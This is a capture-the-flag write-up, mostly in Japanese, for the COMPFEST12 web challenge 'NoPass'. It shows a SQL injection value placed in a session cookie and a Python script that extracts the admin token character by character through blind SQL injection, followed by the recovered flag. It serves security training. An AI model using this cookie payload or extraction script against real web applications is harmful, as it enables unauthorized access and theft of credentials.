# NoPass:Web:961pts
Forgets your password! We've already invent secure login system. One account only can log on in one device. The flag is the token of admin.  
P.S: Choose unique username to avoid duplicate.  
128.199.157.172:28337  
Hint  
I think the token is saved in database  

# Solution
アクセスするとNoPass.htmlがある。  
LoginページではUsernameのみでログインできるようだ。  
ただし重複はブロックされるので、adminでのログインはできないようだ。  
abc0123でログインすると、Dashboard.htmlとFlag.htmlが表示されるがflagは無いようだ。  
cookieに以下のtokenが入っていた。  
```text
jv4hdNnATkfkHba1NIfl7PWq9tF2mQbY
```
これを以下に書き換える。  
```text
' OR 't' = 't' --
```
するとDashboard_admin.htmlとFlag_admin.htmlが表示されるがflagは無いようだ。  
ここでflagがadminのtokenだと気付く(問題文に書いてあった)。  
あとは以下のtoooooken.pyで人文字ずつ探せばよい。  
likeは大文字小文字の区別がないので困る。  
```python:toooooken.py
import requests

url = "http://128.199.157.172:28337/flag"

flag = "COMPFEST12{"
i = 12

while True:
	for j in "}[]0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_":
		cookie = {"token": "' OR username = 'admin' AND substr(token,{},1) ='{}' --".format(i,j)}
		response = requests.get(url=url, cookies=cookie)
		if "flag.txt" in response.text:
			break
	i += 1
	flag += j
	print(flag)
	if j == "}":
		break
```
実行すると以下のようにflagが得られた。  
```bash
$ python toooooken.py
COMPFEST12{e
COMPFEST12{eZ
COMPFEST12{eZs
COMPFEST12{eZsQ
COMPFEST12{eZsQL
COMPFEST12{eZsQLi
COMPFEST12{eZsQLi_
COMPFEST12{eZsQLi_4
COMPFEST12{eZsQLi_4s
COMPFEST12{eZsQLi_4s_
COMPFEST12{eZsQLi_4s_u
COMPFEST12{eZsQLi_4s_us
COMPFEST12{eZsQLi_4s_usU
COMPFEST12{eZsQLi_4s_usUa
COMPFEST12{eZsQLi_4s_usUaL
COMPFEST12{eZsQLi_4s_usUaL_
COMPFEST12{eZsQLi_4s_usUaL__
COMPFEST12{eZsQLi_4s_usUaL__2
COMPFEST12{eZsQLi_4s_usUaL__20
COMPFEST12{eZsQLi_4s_usUaL__203
COMPFEST12{eZsQLi_4s_usUaL__2033
COMPFEST12{eZsQLi_4s_usUaL__20334
COMPFEST12{eZsQLi_4s_usUaL__20334e
COMPFEST12{eZsQLi_4s_usUaL__20334ef
COMPFEST12{eZsQLi_4s_usUaL__20334eff
COMPFEST12{eZsQLi_4s_usUaL__20334eff}
```

## COMPFEST12{eZsQLi_4s_usUaL__20334eff}